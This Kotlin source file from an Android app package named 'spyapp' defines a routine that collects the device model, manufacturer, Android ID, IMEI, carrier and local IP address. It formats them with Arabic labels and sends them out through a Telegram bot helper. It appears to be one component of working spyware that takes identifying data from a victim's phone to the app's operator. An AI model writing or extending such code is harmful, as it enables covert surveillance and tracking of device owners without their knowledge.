package com.spyapp

import android.content.Context
import android.os.Build
import android.provider.Settings
import android.telephony.TelephonyManager
import java.net.NetworkInterface
import java.text.SimpleDateFormat
import java.util.*

object DeviceInfo {

    fun collectAndSend(context: Context) {
        val sb = StringBuilder()

        sb.appendLine("╔══════════════════════════╗")
        sb.appendLine("║   📱 معلومات الجهاز      ║")
        sb.appendLine("╚══════════════════════════╝")
        sb.appendLine()

        sb.appendLine("🏷️ *الموديل:* ${Build.MODEL}")
        sb.appendLine("📱 *الشركة:* ${Build.MANUFACTURER}")
        sb.appendLine("🤖 *إصدار أندرويد:* ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")
        sb.appendLine("🔑 *Android ID:* `${getAndroidId(context)}`")

        // IMEI (يحتاج صلاحية READ_PHONE_STATE)
        try {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
            tm?.let {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    sb.appendLine("📞 *IMEI:* `${it.imei ?: "غير متاح"}`")
                } else {
                    sb.appendLine("📞 *Device ID:* `${it.deviceId ?: "غير متاح"}`")
                }
                sb.appendLine("📡 *المشغل:* ${it.networkOperatorName ?: "غير معروف"}")
            }
        } catch (e: SecurityException) {
            sb.appendLine("📞 *IMEI:* `(صلاحية مرفوضة)`")
        }

        sb.appendLine("🌐 *IP:* `${getLocalIpAddress()}`")

        sb.appendLine()
        sb.appendLine("🕐 _${SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())}_")

        TelegramBot.send(context, sb.toString())
    }

    fun getDeviceName(context: Context): String {
        return "${Build.MANUFACTURER} ${Build.MODEL}"
    }

    private fun getAndroidId(context: Context): String {
        return Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
            ?: "غير متاح"
    }

    private fun getLocalIpAddress(): String {
        try {
            val interfaces = NetworkInterface.getNetworkInterfaces()
            while (interfaces.hasMoreElements()) {
                val ni = interfaces.nextElement()
                val addresses = ni.inetAddresses
                while (addresses.hasMoreElements()) {
                    val addr = addresses.nextElement()
                    if (!addr.isLoopbackAddress && addr.hostAddress?.indexOf(':') == -1) {
                        return addr.hostAddress ?: "0.0.0.0"
                    }
                }
            }
        } catch (_: Exception) {}
        return "غير متاح"
    }
}
